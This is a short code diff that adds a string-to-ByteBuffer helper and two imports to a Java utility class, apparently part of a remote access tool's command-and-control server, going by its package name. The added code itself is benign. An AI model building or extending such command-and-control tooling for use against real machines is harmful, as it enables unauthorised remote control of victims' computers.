@@ -1,6 +1,9 @@
 package devs.alex.sah.rat.c2server.utils;
 
 import org.springframework.web.socket.WebSocketSession;
+
+import java.nio.ByteBuffer;
+import java.nio.charset.Charset;
 import java.util.*;
 
 public class Utils {
@@ -36,6 +39,11 @@ public class Utils {
         } else{
             return result.length()+3 + result;
         }
+    }
+
+
+    public static ByteBuffer string2ByteBuffer(String msg, Charset charset){
+        return ByteBuffer.wrap(msg.getBytes(charset));
     }
 
 }
